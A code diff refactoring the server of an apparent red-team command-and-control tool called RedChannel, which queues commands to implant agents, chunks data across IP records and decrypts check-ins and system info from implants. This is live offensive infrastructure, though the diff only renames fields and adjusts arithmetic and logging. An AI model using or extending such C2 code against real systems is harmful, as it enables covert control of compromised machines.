@@ -252,8 +252,9 @@ export default class RedChannel {
         if (this.modules.agent.config.proxy_key) configProto.webKey = { value: this.modules.agent.config.proxy_key };
         if (this.modules.agent.config.proxy_url) configProto.webUrl = { value: this.modules.agent.config.proxy_url };
 
+        const configProtoBuffer = Buffer.from(implant.AgentConfig.encode(configProto).finish());
         // no need to send data, just the config proto
-        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, undefined, configProto).catch((ex) => {
+        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, configProtoBuffer).catch((ex) => {
             this.log.error(`error queueing data: ${emsg(ex)}`);
         });
     }
@@ -276,14 +277,13 @@ export default class RedChannel {
      * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
      *
      */
-    async queueData(agentId: string, command: implant.AgentCommand, data?: Buffer, configData?: implant.AgentConfig) {
+    async queueData(agentId: string, command: implant.AgentCommand, data?: Buffer) {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
 
         const commandProto = implant.Command.Request.create({
             command: command,
-            input: data,
-            config: configData,
+            data: data,
         });
 
         let commandProtoBuffer = Buffer.from(implant.Command.Request.encode(commandProto).finish());
@@ -299,12 +299,12 @@ export default class RedChannel {
         // prettier-ignore
         const totalIps =
             Math.floor(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP) +
-            (dataBlocks.length % Config.MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);
+            Math.min(1, dataBlocks.length % Config.MAX_DATA_BLOCKS_PER_IP);
 
         // prettier-ignore
         const totalCommands =
             Math.floor(totalIps / Config.MAX_IPS_PER_COMMAND) +
-            (totalIps % Config.MAX_IPS_PER_COMMAND == 0 ? 0 : 1);
+            Math.min(1, totalIps % Config.MAX_IPS_PER_COMMAND);
 
         const dataId = crypto.randomBytes(2).toString("hex");
 
@@ -531,19 +531,19 @@ export default class RedChannel {
         }
 
         if (chunkNumber > totalChunks - 1) {
-            this.log.error(`message: invalid chunk number (out of bounds), current: ${chunkNumber}, total: ${totalChunks}`);
+            this.log.error(`invalid chunk number (out of bounds), current: ${chunkNumber}, total: ${totalChunks}`);
             return res.end();
         }
 
         const dataId: string = segments[3];
         if (dataId.length < 2) {
-            this.log.error(`message: invalid data id: ${dataId}`);
+            this.log.error(`invalid data id: ${dataId}`);
             return res.end();
         }
 
         const chunk: string = segments[4];
         if (chunk.length < 2) {
-            this.log.error(`message: invalid chunk: ${chunk}`);
+            this.log.error(`invalid chunk: ${chunk}`);
             return res.end();
         }
 
@@ -617,7 +617,7 @@ export default class RedChannel {
         let agentData = "";
         try {
             const agentCommandResponseProto = this.decryptAgentData(agentId, checkInPayload);
-            if (agentCommandResponseProto) agentData = Buffer.from(agentCommandResponseProto.output).toString();
+            if (agentCommandResponseProto) agentData = Buffer.from(agentCommandResponseProto.data).toString();
         } catch (ex) {
             throw new Error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
         }
@@ -768,7 +768,7 @@ export default class RedChannel {
                 let agentMessage = "";
                 try {
                     const agentCommandResponseProto = this.decryptAgentData(agentId, data);
-                    if (agentCommandResponseProto) agentMessage = Buffer.from(agentCommandResponseProto.output).toString();
+                    if (agentCommandResponseProto) agentMessage = Buffer.from(agentCommandResponseProto.data).toString();
                 } catch (ex) {
                     this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                     return [
@@ -786,8 +786,8 @@ export default class RedChannel {
                 let sysInfo: implant.SysInfoData = implant.SysInfoData.create({});
                 try {
                     const agentCommandResponseProto = this.decryptAgentData(agentId, data);
-                    if (agentCommandResponseProto && agentCommandResponseProto.sysinfo) {
-                        sysInfo = implant.SysInfoData.create(agentCommandResponseProto.sysinfo);
+                    if (agentCommandResponseProto && agentCommandResponseProto.data) {
+                        sysInfo = implant.SysInfoData.decode(agentCommandResponseProto.data);
                     }
                 } catch (ex) {
                     this.log.error(`cannot decrypt sysinfo from ${agentId}: ${emsg(ex)}`);
